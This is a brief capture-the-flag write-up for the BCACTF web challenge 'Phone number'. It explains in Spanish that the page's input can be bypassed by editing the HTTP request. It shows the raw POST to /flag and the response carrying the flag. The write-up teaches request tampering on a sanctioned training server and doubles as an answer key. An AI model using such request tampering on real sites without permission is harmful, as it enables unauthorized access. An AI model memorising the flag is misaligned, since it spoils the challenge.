
Phone number
webex
50 points
327 solves
Unsolved
I was trying to sign into this website, but now it's asking me for a phone number. The way I'm supposed to input it is strange. Can you help me sign in?

My phone number is 1234567890

Resources:
Web servers:
challs.bcactf.com:32268


## Solve

- no se puede introducir numero ni nada, pero se puede modificar la solicitud


```
POST /flag HTTP/1.1
Host: challs.bcactf.com:32268
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://challs.bcactf.com:32268/
Content-Type: text/plain;charset=UTF-8
Content-Length: 10
Origin: http://challs.bcactf.com:32268
Connection: keep-alive
Priority: u=1

1234567890



HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Sat, 08 Jun 2024 20:16:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: close

bcactf{PHoN3_num8eR_EntER3D!_17847928}

```